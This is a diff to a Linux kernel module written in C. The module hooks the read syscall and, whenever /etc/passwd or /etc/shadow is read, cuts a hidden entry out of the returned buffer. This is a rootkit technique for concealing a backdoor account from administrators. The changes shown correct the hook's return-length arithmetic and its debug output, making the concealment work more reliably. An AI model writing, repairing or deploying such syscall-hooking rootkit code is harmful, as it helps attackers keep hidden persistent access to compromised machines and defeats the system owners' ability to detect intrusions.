@@ -18,15 +18,15 @@ extern asmlinkage long (*original_read)(unsigned int, char*, size_t);
 asmlinkage long
 my_read(unsigned int fd, char *buf, size_t count) {
 
-	struct file *file, *tampered;
+	struct file *file;
 
-	u64 file_inode;
+	//u64 file_inode;
 	//dev_t file_dev;
 	//umode_t file_mode;
 	//loff_t file_size;
-	int r;
+	//int r;
 	
-	char* file_name;
+	//char* file_name;
 	char *ptr1, *ptr2, *ptr3;
 	int i, buf_len_to_copy;
 	//int tampered_fd;
@@ -35,22 +35,21 @@ my_read(unsigned int fd, char *buf, size_t count) {
 	char *tmp, *buf2;
 	//loff_t pos, tampered_pos;
 	
-	struct kstat file_ksp;
+	//struct kstat file_ksp;
 	struct path file_path;
 	//file_dev = file_ksp.dev;
 	//file_mode = file_ksp.mode;
 	//file_size = file_ksp.size;
 	//mm_segment_t prev_fs;
-	unsigned int ret;
+	unsigned long ret;
 	
 	file = fget(fd);
-	ret = (*original_read)(fd, buf, count);
 	
 	if (file) {
 		// Get the file name and its inode
-		file_name = file->f_path.dentry->d_name.name;
-		r = vfs_stat(file_name, &file_ksp);
-		file_inode = file_ksp.ino;
+		//file_name = file->f_path.dentry->d_name.name;
+		//r = vfs_stat(file_name, &file_ksp);
+		//file_inode = file_ksp.ino;
 		
 		// Get the absolute path of current file
 		file_path = file->f_path;
@@ -58,11 +57,12 @@ my_read(unsigned int fd, char *buf, size_t count) {
 		tmp = (char *)__get_free_page(GFP_TEMPORARY);
 		abs_path = d_path(&file_path, tmp, PAGE_SIZE);
 		path_put(&file_path);
-		free_page((unsigned long)tmp);
+		free_page(tmp);
+		
+		ret = original_read(fd, buf, count);
 		
 		// If the targeted file and some sanity checks
-		if(ret && (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0) && strlen(buf) > 0) {
-			
+		if(ret && (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0)) {
 			//printk("[FD]: 0x%x, dev: 0x%x, mode: 0x%x, size: 0x%x\n", fd, file_dev, file_mode, file_size);
 			
 			// Allocate new buffer and copy string from user space
@@ -70,8 +70,8 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			copy_from_user(buf2, buf, ret);
 			
 			if (DEBUG == 1) {
-				printk("READ: %s with inode %d\n", abs_path, file_inode);
-				printk("[BufSize before manipulation]:0x%x\n", strlen(buf2));
+				printk("READ: %s\n", abs_path);
+				printk("[BufSize before manipulation]:%ld\n", strlen(buf2));
 			}
 			
 			/* 
@@ -81,13 +81,15 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			ptr1 = buf2;
 			ptr2 = strstr(buf2, hide_str);
 			ptr3 = ptr2;
+			
 			while (*ptr3 != *delimiter)
 				ptr3++;
-
+				
+			ret -= (unsigned long)(ptr3 - ptr2);
 			buf_len_to_copy = ptr1 + strlen(buf2) - ptr3;
 			
 			if (DEBUG == 1) {
-				printk("buf_len_to_copy: %d\n", buf_len_to_copy);
+				printk("buf_len_to_copy: %d, ret: %ld\n", buf_len_to_copy, ret);
 				printk("Ptr1(Contents): %p, Ptr2(hide_str): %p, Ptr3(end hide_str): %p\n", ptr1, ptr2, ptr3);
 			}
 			
@@ -97,7 +99,7 @@ my_read(unsigned int fd, char *buf, size_t count) {
 			buf2[(void*)ptr2 - (void*)ptr1] = NULL;
 			
 			if (DEBUG == 1) 
-				printk("[BufSize after manipulation]: 0x%x\n", strlen(buf2));
+				printk("[BufSize after manipulation]: %ld\n", strlen(buf2));
 			
 			/*
 			// Get the current FS segment descriptor
